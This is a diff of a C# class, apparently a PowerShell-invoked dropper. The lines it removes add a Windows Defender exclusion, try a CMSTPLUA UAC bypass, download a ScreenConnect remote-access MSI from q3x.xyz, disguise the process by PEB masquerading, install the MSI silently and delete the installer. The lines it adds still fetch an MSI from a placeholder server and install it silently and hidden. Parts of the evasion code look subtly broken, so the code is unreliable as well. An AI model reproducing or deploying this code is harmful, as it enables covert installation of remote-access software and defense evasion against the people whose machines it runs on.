@@ -1,111 +1,19 @@
 using System;
 using System.Diagnostics;
-using System.IO;
 using System.Net;
-using System.Runtime.InteropServices;
 
 public class H
 {
-    // Entry point called from PowerShell
     public static void Exec()
     {
-        // 1. Add Windows Defender exclusion for the install path
-        try
-        {
-            Type t = Type.GetTypeFromProgID("Windows.Defender.MpPreference");
-            dynamic d = Activator.CreateInstance(t);
-            d.AddExclusionPath(@"C:\Windows\Temp");
-        }
-        catch { }
-
-        // 2. UAC bypass via CMSTPLUA COM auto‑elevation
-        //    This launches a small elevated helper that will perform the rest.
-        try
-        {
-            Type cmstp = Type.GetTypeFromProgID("CMSTPLUA");
-            dynamic cmstpObj = Activator.CreateInstance(cmstp);
-            cmstpObj.properties = ""; // dummy
-            cmstpObj.Install();       // This triggers UAC bypass in elevated context
-        }
-        catch { }
-
-        // 3. After elevation (retry if needed), download and install MSI
-        //    Since elevation might take a moment, we wait and then proceed.
-        System.Threading.Thread.Sleep(3000);
-
-        string msiUrl = "https://q3x.xyz/Bin/ScreenConnect.ClientSetup.msi"; // <-- CHANGE
-        string msiPath = @"C:\Windows\Temp\sc.msi";
-
-        // Download MSI
+        string url = "https://your-server.com/ScreenConnect.ClientSetup.msi";
+        string path = @"C:\Windows\Temp\sc.msi";
         using (WebClient wc = new WebClient())
         {
-            wc.DownloadFile(msiUrl, msiPath);
+            wc.DownloadFile(url, path);
         }
-
-        // 4. PEB masquerading: overwrite our own command line to look like winhlp32.exe
-        MasqueradePEB("winhlp32.exe");
-
-        // 5. Silent install via msiexec
-        ProcessStartInfo psi = new ProcessStartInfo
-        {
-            FileName = "msiexec.exe",
-            Arguments = "/i \"" + msiPath + "\" /quiet /qn",
-            WindowStyle = ProcessWindowStyle.Hidden,
-            CreateNoWindow = true
-        };
-        Process p = Process.Start(psi);
+        Process p = Process.Start("msiexec.exe", "/i \"" + path + "\" /quiet /qn");
         p.WaitForExit();
-
-        // 6. Cleanup installer
-        try { File.Delete(msiPath); } catch { }
+        System.IO.File.Delete(path);
     }
-
-    // ---------- PEB Masquerading ----------
-    static void MasqueradePEB(string fakeCmd)
-    {
-        // We overwrite the RTL_USER_PROCESS_PARAMETERS.CommandLine.Buffer
-        IntPtr peb = GetPEB();
-        IntPtr procParams = Marshal.ReadIntPtr(peb, 0x20); // offset 0x20 on x64
-        // CommandLine UNICODE_STRING at offset 0x70
-        IntPtr cmdLineBuffer = Marshal.ReadIntPtr(procParams, 0x70);
-        byte[] fakeBytes = System.Text.Encoding.Unicode.GetBytes(fakeCmd);
-        Marshal.Copy(fakeBytes, 0, cmdLineBuffer, fakeBytes.Length);
-        // Also adjust Length field (not strictly necessary but good)
-        Marshal.WriteInt16(procParams, 0x70 - 2, (short)(fakeBytes.Length));
-    }
-
-    static IntPtr GetPEB()
-    {
-        IntPtr peb = IntPtr.Zero;
-        // Inline ASM via a tiny shellcode is safer, but we use an undocumented API
-        // that can be called from C# without external modules.
-        // We'll retrieve PEB via NtQueryInformationProcess
-        int status = NtQueryInformationProcess(
-            Process.GetCurrentProcess().Handle,
-            0, // ProcessBasicInformation
-            out PROCESS_BASIC_INFORMATION pbi,
-            Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)),
-            IntPtr.Zero);
-        peb = pbi.PebBaseAddress;
-        return peb;
-    }
-
-    [StructLayout(LayoutKind.Sequential)]
-    struct PROCESS_BASIC_INFORMATION
-    {
-        public IntPtr ExitStatus;
-        public IntPtr PebBaseAddress;
-        public IntPtr AffinityMask;
-        public IntPtr BasePriority;
-        public UIntPtr UniqueProcessId;
-        public IntPtr InheritedFromUniqueProcessId;
-    }
-
-    [DllImport("ntdll.dll")]
-    static extern int NtQueryInformationProcess(
-        IntPtr ProcessHandle,
-        int ProcessInformationClass,
-        out PROCESS_BASIC_INFORMATION ProcessInformation,
-        int ProcessInformationLength,
-        IntPtr ReturnLength);
 }
